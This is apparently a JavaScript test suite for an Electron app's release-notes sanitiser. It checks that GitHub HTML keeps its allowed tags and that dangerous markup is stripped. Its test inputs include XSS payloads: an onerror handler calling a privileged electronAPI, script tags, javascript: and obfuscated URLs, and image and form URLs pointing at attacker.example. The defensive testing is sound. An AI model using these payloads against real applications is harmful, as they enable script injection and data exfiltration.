const test = require("node:test");
const assert = require("node:assert/strict");
const { createElement } = require("react");
const { renderToStaticMarkup } = require("react-dom/server");
const { createRendererServer } = require("../lib/rendererTestHarness");

// Release notes arrive from electron-updater as the GitHub release body in HTML,
// and the Settings page renders them in a window that has window.electronAPI.
// Any attribute that survives could run script there, so the notes are rebuilt
// from an allowlist. happy-dom stands in for the renderer's DOMParser.

// The shape GitHub's releases feed produces (trimmed from the 1.10.2 notes).
const GITHUB_RELEASE_NOTES = [
  "<h1>OpenWhispr 1.10.2</h1>",
  "<p>A hotfix for 1.10.1.</p>",
  '<h2><g-emoji class="g-emoji" alias="hammer_and_wrench">🛠</g-emoji> Fixes</h2>',
  "<ul>",
  "<li><strong>Summaries no longer time out</strong> — model IDs such as ",
  "<code>google/gemini-3.5-flash-lite</code> work again. (",
  '<a class="issue-link js-issue-link" data-hovercard-type="pull_request" ',
  'data-hovercard-url="/OpenWhispr/openwhispr/pull/2204/hovercard" ',
  'href="https://github.com/OpenWhispr/openwhispr/pull/2204">#2204</a>)</li>',
  "</ul>",
  "<blockquote><p><em>Thanks to everyone who reported it.</em></p></blockquote>",
].join("");

async function renderReleaseNotes(t, html) {
  const { Window } = await import("happy-dom");
  const happyWindow = new Window();
  for (const name of ["DOMParser", "Node"]) {
    const original = Object.getOwnPropertyDescriptor(globalThis, name);
    Object.defineProperty(globalThis, name, {
      value: happyWindow[name],
      configurable: true,
      writable: true,
    });
    t.after(() => {
      if (original) Object.defineProperty(globalThis, name, original);
      else delete globalThis[name];
    });
  }
  t.after(() => happyWindow.happyDOM.close());

  const vite = await createRendererServer(t, { cachePrefix: "openwhispr-release-notes-test-" });
  const { ReleaseNotes } = await vite.ssrLoadModule("/components/settings/ReleaseNotes.tsx");
  return renderToStaticMarkup(createElement(ReleaseNotes, { html }));
}

test("GitHub release notes keep their structure, text and links", async (t) => {
  const html = await renderReleaseNotes(t, GITHUB_RELEASE_NOTES);

  for (const tag of ["<h1", "<h2", "<p", "<ul", "<li", "<strong", "<code", "<em"]) {
    assert.ok(html.includes(tag), `${tag}> renders`);
  }
  assert.ok(html.includes("🛠 Fixes"), "the emoji wrapper is unwrapped, keeping its text");
  assert.ok(html.includes("Thanks to everyone who reported it."), "blockquote text is kept");
  assert.ok(!html.includes("<g-emoji"), "unknown elements do not render");
  assert.ok(!html.includes("<blockquote"), "elements outside the allowlist do not render");
  assert.match(
    html,
    /<a href="https:\/\/github\.com\/OpenWhispr\/openwhispr\/pull\/2204" target="_blank" rel="noopener noreferrer">#2204<\/a>/
  );
  assert.ok(!html.includes("data-hovercard"), "GitHub's data attributes are dropped");
  assert.ok(!html.includes("issue-link"), "GitHub's classes are dropped");
});

test("an image's onerror handler never reaches the page", async (t) => {
  const html = await renderReleaseNotes(
    t,
    '<p>Before<img src=x onerror="window.electronAPI.cleanupApp()">After</p>'
  );

  assert.equal(html, "<div><p>BeforeAfter</p></div>");
});

test("script and style elements are dropped along with their text", async (t) => {
  const html = await renderReleaseNotes(
    t,
    "<p>Kept</p><script>window.electronAPI.cleanupApp()</script><style>p{display:none}</style>"
  );

  assert.ok(!html.includes("<script"), "no script element");
  assert.ok(!html.includes("<style"), "no style element");
  assert.ok(!html.includes("cleanupApp"), "script source does not leak in as text");
  assert.ok(!html.includes("display:none"), "style source does not leak in as text");
  assert.ok(html.includes("<p>Kept</p>"));
});

test("event-handler, style and other attributes are stripped from allowed tags", async (t) => {
  const html = await renderReleaseNotes(
    t,
    '<p onclick="alert(1)" style="position:fixed" id="x">Text</p>' +
      '<a href="https://openwhispr.com" onmouseover="alert(1)" target="_self">Site</a>'
  );

  assert.ok(!/\son[a-z]+=/i.test(html), "no event-handler attribute survives");
  assert.ok(!html.includes("style="), "no inline style survives");
  assert.ok(!html.includes('id="x"'), "no id survives");
  assert.ok(!html.includes("_self"), "the link always opens outside the app");
  assert.ok(html.includes('href="https://openwhispr.com/"'));
});

test("links that are not http(s) lose their href but keep their text", async (t) => {
  const html = await renderReleaseNotes(
    t,
    '<a href="javascript:alert(1)">one</a> <a href="data:text/html,<b>x</b>">two</a> ' +
      '<a href="java&#x09;script:alert(1)">three</a> <a href="/relative">four</a>'
  );

  assert.equal(html, "<div>one two three four</div>");
});

test("a remote image renders as a link instead of fetching its URL", async (t) => {
  const html = await renderReleaseNotes(
    t,
    '<p><img src="https://attacker.example/pixel.png?d=secret" alt="Screenshot"></p>' +
      '<p><img src="https://attacker.example/unlabelled.png"></p>'
  );

  assert.ok(!html.includes("<img"), "no image element");
  assert.match(
    html,
    /<a href="https:\/\/attacker\.example\/pixel\.png\?d=secret" target="_blank" rel="noopener noreferrer">Screenshot<\/a>/
  );
  assert.ok(
    html.includes(">https://attacker.example/unlabelled.png</a>"),
    "an image without alt text is labelled with its URL"
  );
});

test("an image inside a link becomes that link's text, not a nested link", async (t) => {
  const html = await renderReleaseNotes(
    t,
    '<a href="https://github.com/user-attachments/assets/1"><img src="https://github.com/user-attachments/assets/1" alt="image" style="max-width: 100%;"></a>'
  );

  assert.ok(!html.includes("<img"), "no image element");
  assert.equal((html.match(/<a\b/g) || []).length, 1, "one link, not two");
  assert.ok(html.includes(">image</a>"));
});

test("an image whose source is not http(s) keeps only its alt text", async (t) => {
  const html = await renderReleaseNotes(
    t,
    '<p><img src="data:image/png;base64,AAAA" alt="Diagram"><img src="javascript:alert(1)"></p>'
  );

  assert.equal(html, "<div><p>Diagram</p></div>");
});

test("forms and their controls do not render", async (t) => {
  const html = await renderReleaseNotes(
    t,
    '<form action="https://attacker.example"><input name="q" value="v"><button formaction="https://attacker.example">Go</button></form>'
  );

  assert.equal(html, "<div>Go</div>");
});
